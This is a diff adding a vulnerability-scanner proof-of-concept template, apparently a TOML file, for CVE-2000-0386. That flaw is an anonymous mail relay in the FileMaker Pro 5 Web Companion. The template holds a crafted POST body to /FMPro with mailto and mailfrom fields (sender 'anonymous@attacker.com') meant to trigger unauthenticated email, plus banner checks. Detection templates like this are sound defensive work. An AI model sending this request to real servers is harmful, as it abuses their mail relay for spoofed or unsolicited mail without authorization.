@@ -1,0 +1,53 @@
+[info]
+author = "AVE"
+description = "检测 FileMaker Pro 5 Web Companion 是否存在开放邮件中继漏洞，通过发送特制 HTTP POST 请求尝试触发匿名邮件发送功能"
+id = "POC-AVE-2000-0405"
+name = "FileMaker Pro 5 Web Companion 匿名邮件中继漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0405"]
+vuln_id = [
+    "CVE-2000-0386",
+    "AVE-2000-0405",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/FMPro"
+protocol = "http"
+
+[poc.requests.body]
+content = "-db=test.fp5&-lay=web&-format=email.htm&mailto=test@test.com&mailfrom=anonymous@attacker.com&subject=test&body=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "Error",
+    "Mailing",
+    "mailto",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Web Companion",
+    "FileMaker",
+    "FMPro",
+    "FMWeb",
+]
